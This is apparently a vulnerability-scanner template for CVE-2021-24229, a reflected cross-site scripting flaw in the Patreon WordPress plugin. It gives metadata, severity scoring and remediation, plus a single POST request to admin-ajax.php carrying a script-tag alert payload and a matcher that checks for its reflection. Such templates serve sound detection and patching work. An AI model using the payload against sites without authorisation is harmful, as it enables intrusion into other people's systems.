id: CVE-2021-24229

info:
  name: Reflected XSS in Patreon WordPress Plugin
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    The Jetpack Scan team identified a Reflected Cross-Site Scripting via the patreon_save_attachment_patreon_level AJAX action of the Patreon WordPress plugin before 1.7.2. This AJAX hook is used to update the pledge level required by Patreon subscribers to access a given attachment. This action is accessible for user accounts with the ‘manage_options’ privilege (i.e., only administrators). Unfortunately, one of the parameters used in this AJAX endpoint is not sanitized before being printed back to the user, so the risk it represents is the same as the previous XSS vulnerability.
  impact: |
    Successful exploitation could allow an attacker to execute malicious scripts in the context of a victim's browser.
  remediation: |
    Update the Patreon WordPress Plugin to the latest patched version to mitigate the Reflected XSS vulnerability.
  reference:
    - https://wpscan.com/vulnerability/001755c4-add3-4566-a022-ab1f83546c1f
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2021-24229
    cwe-id: CWE-79
    epss-score: 0.00228
    epss-percentile: 0.61734
    cpe: cpe:2.3:a:patreon:patreon_wordpress:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: patreon
    product: patreon_wordpress
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=patreon_save_attachment_patreon_level&patreon_attachment_patreon_level=<script>alert(1)</script>

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
